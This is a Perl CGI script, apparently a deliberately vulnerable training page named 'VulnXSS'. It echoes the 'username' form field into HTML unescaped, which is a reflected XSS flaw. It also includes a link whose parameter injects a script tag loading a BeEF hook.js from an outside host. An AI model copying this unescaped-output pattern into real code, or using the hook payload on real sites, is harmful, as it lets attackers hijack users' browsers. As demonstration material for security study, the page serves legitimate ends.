#!/usr/bin/perl

use strict;
use warnings;

print "Content-type: text/html\n\n";
my $ip_address = $ENV{'REMOTE_ADDR'};

my $in;
my %in;

sub parsedata {
    if ($ENV{'REQUEST_METHOD'} eq "POST") {
      read(STDIN, $in, $ENV{'CONTENT_LENGTH'});
    } else {
      $in = $ENV{'QUERY_STRING'};
    }
    my @in = split(/&/, $in);

    # All data from a web form will be URL encoded, so we decode
    # it here and put it in a hash.
    foreach my $i (0 .. $#in) {
	$in[$i] =~ s/\+/ /g; #decode '+' to ' '
	$in[$i] =~ s/%(..)/pack("c",hex($1))/ge; # decode scandics and such
	my ($key, $val) = split(/=/,$in[$i],2);
	$in{$key} .= '\0' if (defined($in{$key}));
	$in{$key} .= $val;
    }
}

parsedata;

    print <<HTML;
    <html>
	<head>
	<title>VulnXSS</title>
	</head>
	<body>
	<h1>VulnXSS</h1>
	Any unauthorized use is strictly prohibited.
	<br/><br/>
	<a href="http://www.sellstar.fi">sellstar.fi</a><br>
	<a href="http://www.google.com">google.com</a><br>
	<a href="http://www.sellstar.fi/bcde.html">sellstar.fi/bcde.html</a><br>
	<a href="http://www.sellstar.fi/security/vulnxss.pl?username=john+%3Cscript+src%3D%22http%3A%2F%2Fwww.jonix.fi%2Fhook.js%22+type%3D%22text%2Fjavascript%22%3E%3C%2Fscript%3E&button=Punch">Beef hook shortcut</a>
	<br/>
	
HTML
    if (defined($in{username})) {
	print "Hi ".$in{username}."!\n";
    }
    print <<HTML;
	<form method="get" action="vulnxss.pl">
	Enter your name:
	<input type="text" id="username" name="username" />
	<input type="submit" name="button" value="Punch" />
	</form>
	</body>
	</html>
HTML

